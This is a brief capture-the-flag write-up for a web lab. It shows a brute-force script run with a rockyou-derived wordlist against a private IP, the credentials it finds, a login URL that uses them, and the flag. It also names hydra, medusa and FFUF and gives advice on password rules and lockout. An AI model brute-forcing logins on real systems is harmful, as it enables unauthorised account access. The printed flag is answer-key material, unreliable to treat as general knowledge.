

db from rockyou wordlist
```
➜  Breach10- git:(main) ✗ sh Ressources/script.sh 10.12.100.231 Ressources/db.txt Ressources/db.txt 
Success: Credentials found, Username - eugene & Password - shadow
Success: Credentials found, Username - evelyn & Password - shadow
Success: Credentials found, Username - excel & Password - shadow
```

`http://IP/?page=signin&username=eugene&password=shadow&Login=Login`

THE FLAG IS : `B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2`

tools u can try:

hydra 

medusa 

FFUF

## # Prevention

1. Make sure passwords have a minimum length, and if your site deals with sensitive data, consider enforcing password complexity rules. This typically means requiring mixed-case letters, and requiring one or more numeric or symbol characters. You might also have a blocklist of “obvious” passwords, or ban passwords with too many repeating symbols.

2. The second defense is to “punish” multiple failed login attempts with the same username. Very secure systems will lock the account until performing an action to prove they are not a script – like solving a CAPTCHA – will do the trick.